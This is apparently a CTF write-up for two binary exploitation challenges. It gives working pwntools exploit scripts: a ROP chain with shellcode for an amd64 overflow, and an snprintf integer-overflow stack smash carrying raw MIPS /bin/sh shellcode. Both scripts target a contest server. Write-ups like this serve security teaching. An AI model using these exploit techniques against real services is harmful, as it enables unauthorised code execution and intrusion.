## dagongren1

Simple overflow. The point is pipe redirection.

```python
from pwn import *
context.arch = 'amd64'
context.log_level = "debug"

binary = ("./dagongren1")
elf = ELF(binary, checksec=False)

if not args['REMOTE']:
    r = process(binary)
else:
    r = remote("81.70.209.171", 50601)

pop_rdi = 0x0000000000400813
pop_rsi_r15 = 0x0000000000400811

sh = 'a'*0x28
sh += flat([
    pop_rdi,
    0x40088B, # %s
    pop_rsi_r15,
    0x600e00,
    0,
    elf.plt['__isoc99_scanf'],
    0x600e00
    ])

r.recvuntil("On\n")
r.sendline(sh)

pause()
r.sendline(asm(shellcraft.sh()))

r.sendline("exec /bin/sh 1>&0")
r.interactive()
```

## SuperCgi

A simple HTTP header parser written in MIPSEL32. The vuln is below:

```c
  v3 = 0xFF;
  i = 0;
  do
  {
    if ( !fgets(buf, 1024, stdin) || !strcoll(buf, "\n") || !strcoll(buf, "\r\n") )
      break;
    v0 = strlen(UA);
    if ( !strncmp(buf, UA, v0) )
    {
      v1 = strlen(UA);
      i = snprintf((int)&ptr[i], v3, "%s", &buf[v1 + 1]);
      v3 -= i;
    }
  }
```

`snprintf` will return more than v3, then causing integer overflow. Thus we can overflow the stack.

We simple write shellcode on the bss section (which seems RWX), and jump to shellcode.

```python
from pwn import *
context.arch = 'mips'
context.endian = 'little'
context.log_level = "debug"
context.bits = 32

import sys 

if not args['REMOTE']:
    r = process(['qemu-mipsel', './SuperCgi'])
    #r = process(['qemu-mipsel', '-g', '1234', './SuperCgi'])
else:
    r = remote("81.70.209.171", 50803)

request = "GET /"
r.sendline(request)

ua = "User-Agent: " + 'a'*0x20 
r.sendline(ua)

ua = "User-Agent: " + 'a'*0xf0
r.sendline(ua)

ua = "User-Agent: " 
ua += 'b'*(0x20-5)
#ua += p32(0x7ffff3c0)
#ua += p32(0x7ffffb10)
ua += p32(0x412e50)
r.sendline(ua)

ua = "\x50\x73\x06\x24\xff\xff\xd0\x04\x50\x73\x0f\x24\xff\xff\x06\x28\xe0\xff\xbd\x27\xd7\xff\x0f\x24\x27\x78\xe0\x01\x21\x20\xef\x03\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x23\xab\x0f\x02\x24\x0c\x01\x01\x01/bin/sh\x00"  
r.sendline(ua)
r.sendline("")

r.interactive()
```
